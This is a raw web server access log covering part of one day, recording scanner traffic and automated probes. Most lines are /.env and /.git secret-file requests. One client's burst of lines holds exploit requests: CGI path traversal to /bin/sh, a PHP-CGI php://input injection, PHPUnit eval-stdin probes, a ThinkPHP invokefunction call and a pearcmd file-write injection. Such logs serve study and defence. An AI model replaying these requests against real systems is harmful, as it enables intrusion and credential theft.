92.255.57.58 - - [12/Jan/2025:00:08:59 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [12/Jan/2025:00:09:00 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.82.77.202 - - [12/Jan/2025:00:13:04 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
78.153.140.148 - - [12/Jan/2025:00:21:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:00:21:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
58.212.237.2 - - [12/Jan/2025:00:22:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
123.157.192.233 - - [12/Jan/2025:00:22:42 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
123.178.210.212 - - [12/Jan/2025:00:22:43 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
113.120.59.2 - - [12/Jan/2025:00:22:51 +0000] "GET / HTTP/1.1" 200 1761 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.255.57.58 - - [12/Jan/2025:00:27:15 +0000] "\x16\x03\x01\x05\xa8\x01" 400 528 "-" "-"
78.153.140.93 - - [12/Jan/2025:00:49:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:00:49:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:00:49:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:00:49:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [12/Jan/2025:01:18:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
110.46.252.144 - - [12/Jan/2025:01:18:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
110.46.252.144 - - [12/Jan/2025:01:18:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [12/Jan/2025:01:37:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [12/Jan/2025:01:40:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:01:40:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
58.242.157.86 - - [12/Jan/2025:01:55:35 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:36 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:36 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:36 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:37 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:37 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:37 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:37 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:38 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:38 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:38 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:38 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:39 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:39 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:39 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:40 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:40 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:40 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:40 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:41 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:41 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:41 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:41 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:42 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:42 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:42 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:42 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:43 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:43 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:43 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:44 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:44 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:44 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:44 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:45 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:45 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:45 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:45 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:46 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:46 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:46 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:46 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:47 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:47 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
58.242.157.86 - - [12/Jan/2025:01:55:47 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
211.223.166.139 - - [12/Jan/2025:02:01:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
147.185.133.115 - - [12/Jan/2025:02:18:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.128.54.126 - - [12/Jan/2025:02:34:52 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [12/Jan/2025:02:35:00 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
78.153.140.93 - - [12/Jan/2025:02:38:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:02:38:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
159.223.69.51 - - [12/Jan/2025:02:43:08 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [12/Jan/2025:02:43:16 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.219.47 - - [12/Jan/2025:02:47:19 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [12/Jan/2025:02:47:27 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.219.47 - - [12/Jan/2025:02:48:02 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [12/Jan/2025:02:48:09 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
195.3.223.55 - - [12/Jan/2025:02:50:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [12/Jan/2025:02:51:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
4.156.21.193 - - [12/Jan/2025:02:58:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.138 - - [12/Jan/2025:02:58:55 +0000] "\x16\x03\x01" 400 528 "-" "-"
198.235.24.138 - - [12/Jan/2025:02:58:55 +0000] "\x16\x03\x01" 400 528 "-" "-"
78.153.140.149 - - [12/Jan/2025:02:59:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:02:59:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
65.49.1.73 - - [12/Jan/2025:03:15:29 +0000] "\x16\x03\x01" 400 528 "-" "-"
185.16.39.104 - - [12/Jan/2025:03:37:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
37.112.5.217 - - [12/Jan/2025:03:44:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:04:02:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:04:02:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [12/Jan/2025:04:04:08 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
78.153.140.149 - - [12/Jan/2025:04:35:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:04:35:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:04:42:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:04:42:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
153.203.140.232 - - [12/Jan/2025:05:10:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [12/Jan/2025:05:17:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:05:17:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [12/Jan/2025:05:33:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
121.175.221.4 - - [12/Jan/2025:05:36:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.224.3.5 - - [12/Jan/2025:06:05:20 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.149 - - [12/Jan/2025:06:06:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:06:06:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:06:13:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:06:13:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.73 - - [12/Jan/2025:06:15:57 +0000] "\x16\x03\x01" 400 528 "-" "-"
205.210.31.73 - - [12/Jan/2025:06:15:58 +0000] "\x16\x03\x01" 400 528 "-" "-"
95.214.55.226 - - [12/Jan/2025:06:16:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [12/Jan/2025:07:06:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:07:06:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:07:15:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:07:15:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [12/Jan/2025:07:18:58 +0000] "GET /.git/index HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1"
46.19.138.234 - - [12/Jan/2025:07:37:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [12/Jan/2025:07:58:51 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:07:58:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [12/Jan/2025:08:25:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [12/Jan/2025:08:28:41 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
184.105.247.196 - - [12/Jan/2025:08:29:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
184.105.247.196 - - [12/Jan/2025:08:32:29 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
2.57.122.161 - - [12/Jan/2025:08:32:34 +0000] "GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3 HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
184.105.247.196 - - [12/Jan/2025:08:33:13 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
78.153.140.149 - - [12/Jan/2025:08:54:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:08:54:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [12/Jan/2025:09:13:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.200.78.250 - - [12/Jan/2025:09:14:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [12/Jan/2025:09:19:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [12/Jan/2025:09:27:49 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:09:27:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.94.145.70 - - [12/Jan/2025:09:48:40 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:09:51:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:09:51:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [12/Jan/2025:10:24:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.77.202 - - [12/Jan/2025:10:34:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.4 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:10:34:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:10:34:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [12/Jan/2025:10:51:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [12/Jan/2025:11:02:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:11:02:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [12/Jan/2025:11:22:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
34.76.133.13 - - [12/Jan/2025:11:44:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
66.175.213.4 - - [12/Jan/2025:11:47:31 +0000] "\x16\x03\x01" 400 528 "-" "-"
78.153.140.93 - - [12/Jan/2025:11:50:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:11:50:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
